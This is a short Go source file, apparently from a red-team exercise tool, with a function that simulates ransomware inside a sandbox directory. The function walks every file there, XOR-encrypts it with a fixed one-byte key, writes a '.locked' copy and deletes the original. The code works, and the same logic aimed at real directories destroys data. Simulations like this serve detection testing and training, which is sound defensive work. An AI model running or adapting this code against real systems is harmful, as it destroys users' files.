package main

import (
	"os"
	"path/filepath"
	"strings"
	"time"
)

func xorCipher(data []byte, key byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key
	}
	return out
}

func SimulateRansomware() {
	Info("[Red] Starting ransomware simulation...")
	
	targets := []string{}
	filepath.Walk(SandboxDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && !strings.HasSuffix(path, ".locked") {
			targets = append(targets, path)
		}
		return nil
	})

	for _, target := range targets {
		Info("[Red] Encrypting: %s", filepath.Base(target))
		
		data, err := os.ReadFile(target)
		if err != nil {
			continue
		}

		encrypted := xorCipher(data, 42)
		lockedPath := target + ".locked"

		os.WriteFile(lockedPath, encrypted, 0644)
		os.Remove(target)

		// Simulate time delay
		time.Sleep(500 * time.Millisecond)
	}

	if len(targets) == 0 {
		Info("[Red] No more files to encrypt. Ransomware simulation idle.")
	}
}
